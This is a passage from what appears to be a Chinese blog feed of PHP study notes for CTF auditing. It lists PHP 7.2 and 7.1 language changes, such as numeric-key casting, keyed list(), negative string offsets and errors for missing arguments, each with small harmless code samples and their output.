php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">use</span> <span class="hljs-title">Foo</span>\<span class="hljs-title">Bar</span>\&#123;<br>    <span class="hljs-title">Foo</span>,<br>    <span class="hljs-title">Bar</span>,<br>    <span class="hljs-title">Baz</span>,<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="（增加）转化数字键"><a href="#（增加）转化数字键" class="headerlink" title="（增加）转化数字键"></a>（增加）转化数字键</h2><p>转化数组为对象类型时，如果数组存在数字键，现在可以访问了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// array to object</span><br><span class="hljs-variable">$arr</span> = [<span class="hljs-number">0</span> =&gt; <span class="hljs-number">1</span>];<br><span class="hljs-variable">$obj</span> = (<span class="hljs-keyword">object</span>)<span class="hljs-variable">$arr</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<br>    <span class="hljs-variable">$obj</span>,<br>    <span class="hljs-variable">$obj</span>-&gt;&#123;<span class="hljs-string">&#x27;0&#x27;</span>&#125;, // now accessible<br>    <span class="hljs-variable">$obj</span>-&gt;&#123;<span class="hljs-number">0</span>&#125; // now accessible<br>);<br><br><span class="hljs-comment"># 结果</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">PHP&lt;7.2</span><br><span class="hljs-comment">object(stdClass)#1 (1) &#123;</span><br><span class="hljs-comment">  [0]=&gt;</span><br><span class="hljs-comment">  int(1)</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">NULL</span><br><span class="hljs-comment">NULL</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">PHP7.2</span><br><span class="hljs-comment">object(stdClass)#1 (1) &#123;</span><br><span class="hljs-comment">  [&quot;0&quot;]=&gt;</span><br><span class="hljs-comment">  int(1)</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">int(1)</span><br><span class="hljs-comment">int(1)</span><br></code></pre></td></tr></table></figure><p>对象转为数组也同样可以了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// object to array</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-class"><span class="hljs-keyword">class</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;&#123;<span class="hljs-number">0</span>&#125; = <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;;<br><span class="hljs-variable">$arr</span> = (<span class="hljs-keyword">array</span>)<span class="hljs-variable">$obj</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<br>    <span class="hljs-variable">$arr</span>,<br>    <span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>], // now accessible<br>    <span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;0&#x27;</span>] // now accessible<br>);<br></code></pre></td></tr></table></figure><h2 id="（废弃）不带引号的字符串"><a href="#（废弃）不带引号的字符串" class="headerlink" title="（废弃）不带引号的字符串"></a>（废弃）不带引号的字符串</h2><p>不带引号的字符串是不存在的全局常量，转化成他们自身的字符串。 在以前，该行为会产生 <strong>E_NOTICE</strong>，但现在会产生 <strong>E_WARNING</strong>。在下一个 PHP 主版本中，将抛出 <strong>Error</strong> 异常。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(NONEXISTENT);<br><br><span class="hljs-comment">/* Output:</span><br><span class="hljs-comment">Warning: Use of undefined constant NONEXISTENT - assumed &#x27;NONEXISTENT&#x27; (this will throw an Error in a future version of PHP) in %s on line %d</span><br><span class="hljs-comment">string(11) &quot;NONEXISTENT&quot;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="新的对象类型-¶"><a href="#新的对象类型-¶" class="headerlink" title="新的对象类型 ¶"></a>新的对象类型<a href="https://www.php.net/manual/zh/migration72.new-features.php#migration72.new-features.object-type"> ¶</a></h2><h2 id="通过名称加载扩展-¶"><a href="#通过名称加载扩展-¶" class="headerlink" title="通过名称加载扩展 ¶"></a>通过名称加载扩展<a href="https://www.php.net/manual/zh/migration72.new-features.php#migration72.new-features.ext-loading-by-name"> ¶</a></h2><h2 id="扩展了参数类型-¶"><a href="#扩展了参数类型-¶" class="headerlink" title="扩展了参数类型 ¶"></a>扩展了参数类型<a href="https://www.php.net/manual/zh/migration72.new-features.php#migration72.new-features.param-type-widening"> ¶</a></h2><h2 id="Disallow-passing-NULL-to-get-class-¶"><a href="#Disallow-passing-NULL-to-get-class-¶" class="headerlink" title="Disallow passing NULL to get_class() ¶"></a>Disallow passing <strong>NULL</strong> to <a href="https://www.php.net/manual/zh/function.get-class.php">get_class()</a><a href="https://www.php.net/manual/zh/migration72.incompatible.php#migration72.incompatible.no-null-to-get_class"> ¶</a></h2>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>php审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP7.1特性</title>
    <link href="/2024/08/31/PHP7-1%E7%89%B9%E6%80%A7/"/>
    <url>/2024/08/31/PHP7-1%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP7-1函数相关变更"><a href="#PHP7-1函数相关变更" class="headerlink" title="PHP7.1函数相关变更"></a>PHP7.1函数相关变更</h1><h2 id="list-现在支持键名"><a href="#list-现在支持键名" class="headerlink" title="list()现在支持键名"></a>list()现在支持键名</h2><p>现在<code>list()</code>和它的新的*[]*语法支持在它内部去指定键名。这意味着它可以将任意类型的数组 都赋值给一些变量（与短数组语法类似）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$data</span> = [<br>    [<span class="hljs-string">&quot;id&quot;</span> =&gt; <span class="hljs-number">1</span>, <span class="hljs-string">&quot;name&quot;</span> =&gt; <span class="hljs-string">&#x27;Tom&#x27;</span>],<br>    [<span class="hljs-string">&quot;id&quot;</span> =&gt; <span class="hljs-number">2</span>, <span class="hljs-string">&quot;name&quot;</span> =&gt; <span class="hljs-string">&#x27;Fred&#x27;</span>],<br>];<br><br><span class="hljs-comment">// list() style</span><br><span class="hljs-keyword">list</span>(<span class="hljs-string">&quot;id&quot;</span> =&gt; <span class="hljs-variable">$id1</span>, <span class="hljs-string">&quot;name&quot;</span> =&gt; <span class="hljs-variable">$name1</span>) = <span class="hljs-variable">$data</span>[<span class="hljs-number">0</span>];<br><br><span class="hljs-comment">// [] style</span><br>[<span class="hljs-string">&quot;id&quot;</span> =&gt; <span class="hljs-variable">$id1</span>, <span class="hljs-string">&quot;name&quot;</span> =&gt; <span class="hljs-variable">$name1</span>] = <span class="hljs-variable">$data</span>[<span class="hljs-number">0</span>];<br><br><span class="hljs-comment">// list() style</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">list</span>(<span class="hljs-string">&quot;id&quot;</span> =&gt; <span class="hljs-variable">$id</span>, <span class="hljs-string">&quot;name&quot;</span> =&gt; <span class="hljs-variable">$name</span>)) &#123;<br>    <span class="hljs-comment">// logic here with $id and $name</span><br>&#125;<br><br><span class="hljs-comment">// [] style</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> [<span class="hljs-string">&quot;id&quot;</span> =&gt; <span class="hljs-variable">$id</span>, <span class="hljs-string">&quot;name&quot;</span> =&gt; <span class="hljs-variable">$name</span>]) &#123;<br>    <span class="hljs-comment">// logic here with $id and $name</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="禁止动态调用的函数"><a href="#禁止动态调用的函数" class="headerlink" title="禁止动态调用的函数"></a>禁止动态调用的函数</h2><p>如下：</p><ul><li><a href="https://www.php.net/manual/zh/function.assert.php">assert()</a> - with a string as the first argument</li><li><a href="https://www.php.net/manual/zh/function.compact.php">compact()</a></li><li><a href="https://www.php.net/manual/zh/function.extract.php">extract()</a></li><li><a href="https://www.php.net/manual/zh/function.func-get-args.php">func_get_args()</a></li><li><a href="https://www.php.net/manual/zh/function.func-get-arg.php">func_get_arg()</a></li><li><a href="https://www.php.net/manual/zh/function.func-num-args.php">func_num_args()</a></li><li><a href="https://www.php.net/manual/zh/function.get-defined-vars.php">get_defined_vars()</a></li><li><a href="https://www.php.net/manual/zh/function.mb-parse-str.php">mb_parse_str()</a> - with one arg</li><li><a href="https://www.php.net/manual/zh/function.parse-str.php">parse_str()</a> - with one arg</li></ul><p>尾随的<code>-</code>代表禁止动态调用的条件。<code>func_get_args</code>等几个函数测试了下好像并没有禁止动态调用？不太懂。</p><h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h2><p>对<code>allowed_classes</code>参数严格化，如果对其传入的值是<strong>布尔值</strong>和<strong>数组</strong>之外的内容，<code>unserialize</code>将返回<strong>False</strong>和<strong>E_WARNING</strong></p><h2 id="getenv可以不需要传入参数"><a href="#getenv可以不需要传入参数" class="headerlink" title="getenv可以不需要传入参数"></a>getenv可以不需要传入参数</h2><p><code>getenv()</code> 可以不传入任何参数。 如果不传入参数，此函数会以关联数组的形式 返回所有的环境变量。</p><p><img src="C:\Users\a1348\Desktop\WebBook-master\WebBook-master\images\19-10-1_PHP_PHP71函数相关变更_2.png"></p><h2 id="parse-url支持RFC3986"><a href="#parse-url支持RFC3986" class="headerlink" title="parse_url支持RFC3986"></a>parse_url支持RFC3986</h2><p><code>parse_url()</code> 更加严格的限制， 并且提供对 RFC3986 的支持。</p><h2 id="session-start将返回false"><a href="#session-start将返回false" class="headerlink" title="session_start将返回false"></a>session_start将返回false</h2><p><code>session_start()</code> 当无法成功初始化会话的时候，返回 <strong>FALSE</strong>， 并且不会初始化超级变量 <code>$_SESSION</code>。</p><p>但是我测试的时候发现，PHP7.0已经会返回False了（Win+PHP7.12nts</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">session_start</span>(<span class="hljs-string">&#x27;11&#x27;</span>));<br>@<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><br><span class="hljs-comment"># 结果</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">php5</span><br><span class="hljs-comment">bool(true)</span><br><span class="hljs-comment">array(0) &#123;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">PHP5</span><br><span class="hljs-comment">bool(false)</span><br><span class="hljs-comment">NULL</span><br></code></pre></td></tr></table></figure><h2 id="（废弃）两个函数的Eval选项"><a href="#（废弃）两个函数的Eval选项" class="headerlink" title="（废弃）两个函数的Eval选项"></a>（废弃）两个函数的Eval选项</h2><p><a href="https://www.php.net/manual/zh/function.mb-ereg-replace.php">mb_ereg_replace()</a>和<a href="https://www.php.net/manual/zh/function.mb-eregi-replace.php">mb_eregi_replace()</a></p><h2 id="（废弃）ext-mcrypt"><a href="#（废弃）ext-mcrypt" class="headerlink" title="（废弃）ext&#x2F;mcrypt"></a>（废弃）ext&#x2F;mcrypt</h2><h1 id="PHP7-1语法相关的变更"><a href="#PHP7-1语法相关的变更" class="headerlink" title="PHP7.1语法相关的变更"></a>PHP7.1语法相关的变更</h1><h2 id="增加）短数组"><a href="#增加）短数组" class="headerlink" title="(增加）短数组"></a>(增加）短数组</h2><p>短数组语法<code>[]</code>现在作为<code>list()</code>语法的一个备选项，可以用于将数组的值赋给一些变量（包括在<em>foreach</em>中）。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$data</span> = [<br>    [<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;Tom&#x27;</span>],<br>    [<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;Fred&#x27;</span>],<br>];<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$data</span>);<br><br><span class="hljs-comment">// list() style</span><br><br><span class="hljs-keyword">list</span>(<span class="hljs-variable">$id1</span>, <span class="hljs-variable">$name1</span>) = <span class="hljs-variable">$data</span>[<span class="hljs-number">0</span>];<br><br><span class="hljs-comment">// [] style</span><br><span class="hljs-comment">#[$id1, $name1] = $data[0];</span><br><br><span class="hljs-comment">// list() style</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">list</span>(<span class="hljs-variable">$id</span>, <span class="hljs-variable">$name</span>)) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$id</span> <span class="hljs-subst">$name</span>\n&quot;</span>;<br>    <span class="hljs-comment">// logic here with $id and $name</span><br>&#125;<br><br><span class="hljs-comment">// [] style</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> [<span class="hljs-variable">$id</span>, <span class="hljs-variable">$name</span>]) &#123;<br>    <span class="hljs-comment">// logic here with $id and $name</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="（增加）支持为负的字符串偏移量"><a href="#（增加）支持为负的字符串偏移量" class="headerlink" title="（增加）支持为负的字符串偏移量"></a>（增加）支持为负的字符串偏移量</h2><p>现在所有支持偏移量的<a href="https://www.php.net/manual/zh/book.strings.php">字符串操作函数</a> 都支持接受负数作为偏移量，包括通过<code>[]</code>或<code>&#123;&#125;</code>操作<a href="https://www.php.net/manual/zh/language.types.string.php#language.types.string.substr">字符串下标</a>。在这种情况下，一个负数的偏移量会被理解为一个从字符串结尾开始的偏移量。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;abcdef&quot;</span>[-<span class="hljs-number">2</span>]); <span class="hljs-comment">// string (1) &quot;e&quot;</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-string">&quot;aabbcc&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, -<span class="hljs-number">3</span>));  <span class="hljs-comment">// int(3)</span><br></code></pre></td></tr></table></figure><p>字符串也同样支持</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$string</span> = <span class="hljs-string">&#x27;bar&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;The last character of &#x27;<span class="hljs-subst">$string</span>&#x27; is &#x27;<span class="hljs-subst">$string</span>[-1]&#x27;.\n&quot;</span>;<br><br><span class="hljs-comment"># 结果</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">The last character of &#x27;bar&#x27; is &#x27;r&#x27;.</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="（增加）当传递参数过少时将抛出错误"><a href="#（增加）当传递参数过少时将抛出错误" class="headerlink" title="（增加）当传递参数过少时将抛出错误"></a>（增加）当传递参数过少时将抛出错误</h2><p>在过去如果我们调用一个用户定义的函数时，提供的参数不足，那么将会产生一个警告(warning)。 现在，这个警告被提升为一个错误异常(Error exception)，意味着PHP会中断执行。这个变更仅对用户定义的函数生效， 并不包含内置函数。例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-variable">$param</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;1\n&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">system</span>();<br><span class="hljs-title function_ invoke__">test</span>();<br></code></pre></td></tr></table></figure><p><img src="/Users/j7ur8/WebBook/BookBuild/images/19-10-2_PHP_PHP71%E8%AF%AD%E6%B3%95%E7%9B%B8%E5%85%B3%E5%8F%98%E6%9B%B4_1.png"></p><h2 id="引用数组元素创建元素的顺序更改"><a href="#引用数组元素创建元素的顺序更改" class="headerlink" title="引用数组元素创建元素的顺序更改"></a>引用数组元素创建元素的顺序更改</h2><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs sml">&lt;?php<br>$<span class="hljs-built_in">array</span> = <span class="hljs-literal">[]</span>;<br>$<span class="hljs-built_in">array</span>[<span class="hljs-string">&quot;a&quot;</span>] =&amp; $<span class="hljs-built_in">array</span>[<span class="hljs-string">&quot;b&quot;</span>];<br>$<span class="hljs-built_in">array</span>[<span class="hljs-string">&quot;b&quot;</span>] = <span class="hljs-number">1</span>;<br>var_dump($<span class="hljs-built_in">array</span>);<br><br># 结果<br>/*<br><span class="hljs-type">PHP7</span>.<span class="hljs-number">0</span><br><span class="hljs-built_in">array</span>(<span class="hljs-number">2</span>) &#123;<br>  [<span class="hljs-string">&quot;a&quot;</span>]=&gt;<br>  &amp;<span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br>  [<span class="hljs-string">&quot;b&quot;</span>]=&gt;<br>  &amp;<span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br>&#125;<br><br><span class="hljs-type">PHP7</span>.<span class="hljs-number">1</span><br><span class="hljs-built_in">array</span>(<span class="hljs-number">2</span>) &#123;<br>  [<span class="hljs-string">&quot;b&quot;</span>]=&gt;<br>  &amp;<span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br>  [<span class="hljs-string">&quot;a&quot;</span>]=&gt;<br>  &amp;<span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br>&#125;<br>*/<br></code></pre></td></tr></table></figure><h2 id="JSON编码和解码"><a href="#JSON编码和解码" class="headerlink" title="JSON编码和解码"></a>JSON编码和解码</h2><p>解码一个空键值将会解析为一个空属性名，而之前会解析为<code>_empty_</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;&#x27;</span> =&gt; <span class="hljs-number">1</span>])));<br><br><span class="hljs-comment"># 结果</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">PHP&lt;7.1</span><br><span class="hljs-comment">object(stdClass)#1 (1) &#123;</span><br><span class="hljs-comment">  [&quot;_empty_&quot;]=&gt;</span><br><span class="hljs-comment">  int(1)</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">PHP7.1</span><br><span class="hljs-comment">object(stdClass)#1 (1) &#123;</span><br><span class="hljs-comment">  [&quot;&quot;]=&gt;</span><br><span class="hljs-comment">  int(1)</span><br><span class="hljs-comment">&#125;</span><br></code></pre></td></tr></table></figure><h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="可为空（Nullable）类型-¶"><a href="#可为空（Nullable）类型-¶" class="headerlink" title="可为空（Nullable）类型 ¶"></a>可为空（Nullable）类型<a href="https://www.php.net/manual/zh/migration71.new-features.php#migration71.new-features.nullable-types"> ¶</a></h2><h2 id="Void-函数-¶"><a href="#Void-函数-¶" class="headerlink" title="Void 函数 ¶"></a>Void 函数<a href="https://www.php.net/manual/zh/migration71.new-features.php#migration71.new-features.void-functions"> ¶</a></h2><h2 id="类常量可见性-¶"><a href="#类常量可见性-¶" class="headerlink" title="类常量可见性 ¶"></a>类常量可见性<a href="https://www.php.net/manual/zh/migration71.new-features.php#migration71.new-features.class-constant-visibility"> ¶</a></h2><h2 id="iterable-伪类-¶"><a href="#iterable-伪类-¶" class="headerlink" title="iterable 伪类 ¶"></a><a href="https://www.php.net/manual/zh/language.types.iterable.php">iterable</a> 伪类<a href="https://www.php.net/manual/zh/migration71.new-features.php#migration71.new-features.iterable-pseudo-type"> ¶</a></h2><h2 id="多异常捕获处理-¶"><a href="#多异常捕获处理-¶" class="headerlink" title="多异常捕获处理 ¶"></a>多异常捕获处理<a href="https://www.php.net/manual/zh/migration71.new-features.php#migration71.new-features.mulit-catch-exception-handling"> ¶</a></h2><h2 id="Invalid-class-interface-and-trait-names-¶"><a href="#Invalid-class-interface-and-trait-names-¶" class="headerlink" title="Invalid class, interface, and trait names ¶"></a>Invalid class, interface, and trait names<a href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.invalid-class-names"> ¶</a></h2><h2 id="Numerical-string-conversions-now-respect-scientific-notation-¶"><a href="#Numerical-string-conversions-now-respect-scientific-notation-¶" class="headerlink" title="Numerical string conversions now respect scientific notation ¶"></a>Numerical string conversions now respect scientific notation<a href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.numerical-strings-scientific-notation"> ¶</a></h2><h2 id="Fixes-to-mt-rand-algorithm-¶"><a href="#Fixes-to-mt-rand-algorithm-¶" class="headerlink" title="Fixes to mt_rand() algorithm ¶"></a>Fixes to <a href="https://www.php.net/manual/zh/function.mt-rand.php">mt_rand()</a> algorithm<a href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.fixes-to-mt_rand-algorithm"> ¶</a></h2><h2 id="rand-aliased-to-mt-rand-and-srand-aliased-to-mt-srand-¶"><a href="#rand-aliased-to-mt-rand-and-srand-aliased-to-mt-srand-¶" class="headerlink" title="rand() aliased to mt_rand() and srand() aliased to mt_srand() ¶"></a><a href="https://www.php.net/manual/zh/function.rand.php">rand()</a> aliased to <a href="https://www.php.net/manual/zh/function.mt-rand.php">mt_rand()</a> and <a href="https://www.php.net/manual/zh/function.srand.php">srand()</a> aliased to <a href="https://www.php.net/manual/zh/function.mt-srand.php">mt_srand()</a> <a href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.rand-srand-aliases">¶</a></h2><h2 id="Disallow-the-ASCII-delete-control-character-in-identifiers-¶"><a href="#Disallow-the-ASCII-delete-control-character-in-identifiers-¶" class="headerlink" title="Disallow the ASCII delete control character in identifiers ¶"></a>Disallow the ASCII delete control character in identifiers<a href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.delete-control-character-in-identifiers"> ¶</a></h2><h2 id="在不完整的对象上不再调用析构方法-¶"><a href="#在不完整的对象上不再调用析构方法-¶" class="headerlink" title="在不完整的对象上不再调用析构方法 ¶"></a>在不完整的对象上不再调用析构方法<a href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.dont-call-destructors"> ¶</a></h2><h2 id="call-user-func-不再支持对传址的函数的调用-¶"><a href="#call-user-func-不再支持对传址的函数的调用-¶" class="headerlink" title="call_user_func()不再支持对传址的函数的调用 ¶"></a><a href="https://www.php.net/manual/zh/function.call-user-func.php">call_user_func()</a>不再支持对传址的函数的调用 <a href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.call_user_func-with-ref-args">¶</a></h2><h2 id="ini配置项移除-¶"><a href="#ini配置项移除-¶" class="headerlink" title="ini配置项移除 ¶"></a>ini配置项移除<a href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.removed-ini-directives"> ¶</a></h2><h2 id="Sort-order-of-equal-elements"><a href="#Sort-order-of-equal-elements" class="headerlink" title="Sort order of equal elements"></a>Sort order of equal elements</h2><h2 id="Lexically-bound-variables-cannot-reuse-names-¶"><a href="#Lexically-bound-variables-cannot-reuse-names-¶" class="headerlink" title="Lexically bound variables cannot reuse names ¶"></a>Lexically bound variables cannot reuse names<a href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.lexical-names"> ¶</a></h2>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>php审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP7.0特性</title>
    <link href="/2024/08/31/PHP7-0%E7%89%B9%E6%80%A7/"/>
    <url>/2024/08/31/PHP7-0%E7%89%B9%E6%80%A7/</url>
    
